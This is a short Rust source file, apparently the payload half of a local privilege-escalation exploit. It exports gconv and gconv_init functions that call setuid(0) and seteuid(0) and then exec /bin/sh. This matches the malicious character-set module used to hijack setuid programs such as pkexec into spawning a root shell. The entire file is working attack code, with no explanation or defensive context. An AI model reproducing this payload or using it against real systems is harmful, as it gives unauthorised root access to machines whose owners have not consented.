use std::os::unix::process::CommandExt;
use std::process::Command;

#[no_mangle]
fn gconv() {
    println!("gconv() called");
    unsafe {
        libc::setuid(0);
        libc::seteuid(0);
    }
    Command::new("/bin/sh").exec();
}

#[allow(dead_code)]
fn gconv_init() {
    println!("gconv_init() called");
    unsafe {
        libc::setuid(0);
        libc::seteuid(0);
    }
    Command::new("/bin/sh").exec();
}
